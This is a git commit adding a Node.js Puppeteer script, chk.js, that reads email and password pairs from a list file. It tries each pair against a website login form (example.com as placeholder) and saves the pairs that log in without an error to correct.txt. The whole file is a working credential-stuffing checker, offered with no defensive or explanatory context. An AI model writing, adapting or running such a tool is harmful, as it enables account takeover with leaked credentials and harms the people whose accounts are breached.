a717ad5eeb4f6875bba1eabe38f8659278f8b9ed
marx <mwtteixeira@protonmail.com>
2021-09-11 16:24:38 -0300

    first commit

---
+++ chk.js
@@ -0,0 +1,42 @@
+const fs = require('fs')
+const puppeteer = require('puppeteer')
+var archive = fs.readFileSync('list.txt', 'utf-8')
+var lines = archive.split(/\r?\n/)
+
+async function process () {  
+
+ for(line of lines) {
+    var newline = line.split(';')
+
+    console.log(`Email: ${newline[0]}, Password: ${newline[1]}`)
+
+    const browser = await puppeteer.launch({
+            headless: true,
+          });
+
+          const page = await browser.newPage();
+          page.waitForTimeout(2000)    
+
+          await page.goto('https://example.com');         
+          await page.type('[type="email"]', newline[0])          
+          await page.type('[type="password"]', newline[1])          
+          await page.click('[type="button"]')
+          await page.waitForTimeout(2000) 
+
+          try {           
+           go =  await page.waitForSelector('[class="Error Message"]', {visible: true}); //or Error Code
+           if (go) {
+             console.log("incorrect!!")
+           }
+          } catch (error) {            
+            fs.appendFile('correct.txt', `${newline[0]}, ${newline[1]}, '\n\r'`, function (err) {
+              if (err) throw err;
+              console.log('Correct!!' + error);
+            })
+          }
+         
+          await page.waitForTimeout(1000)
+          await browser.close()
+    }  
+}
+process()
